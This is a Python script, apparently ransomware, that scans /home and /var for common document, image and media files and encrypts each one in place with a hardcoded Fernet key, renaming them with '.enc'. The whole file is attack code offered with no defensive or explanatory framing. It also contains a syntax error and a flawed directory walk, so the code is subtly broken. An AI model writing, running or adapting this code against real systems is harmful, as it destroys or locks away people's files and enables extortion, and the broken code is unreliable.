import os
import threading
import magic
from cryptography.fernet import Fernet

mimes = ['video/x-msvideo', 'application/octet-stream', 'application/x-bzip', 'application/x-bzip2', 'text/css', 'text/csv', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'image/gif', 'text/html', 'text/plain', 'image/jpeg', 'application/json', 'text/markdown', 'text/javascript', 'audio/mpeg', 'video/mp4', 'video/mpeg', 'audio/ogg', 'video/ogg', 'image/png', 'application/pdf']
key = b'OpBGO6mL32_5JjnibDDqi8KMoxjllVQbJBiic__lVGs='
fernet = Fernet(key)

def verifymime(path):
	try:
		path = os.path.normpath(path)
		fmagic = magic.Magic(mime=True)
		ftype = fmagic.from_file(path)

		if ftype in mimes:
			files.append(path)
	except OSError:
		None


def listdir(path):
	try:
		for file in os.listdir(path):
			full_path = os.path.join(path, file)
			if os.path.islink(full_path):
				continue
			if os.path.isdir(full_path):
				dirs.append(full_path)
			if os.path.isfile(full_path):
				verifymime(full_path):
	except PermissionError:
		None


def encrypt(path):
	with open(path, 'rb') as f:
		data = f.read()
	enc_data = fernet.encrypt(data)
	with open(path, 'wb') as f:
		f.write(enc_data)
	os.rename(path, path+'.enc')


files = []
dirs = []
listdir('/home')
listdir('/var')

if len(dirs) >= 0:
	threads = []
	for dir in dirs:
		t = threading.Thread(target=listdir, args=(dir,))
		t.start()

		threads.append(t)
	for t in threads:
		t.join()

if len(files) >= 0:
	threads = []
	for f in files:
		t = threading.Thread(target=encrypt, args=(f,))
		t.start()

		threads.append(t)

	for t in threads:
		t.join()

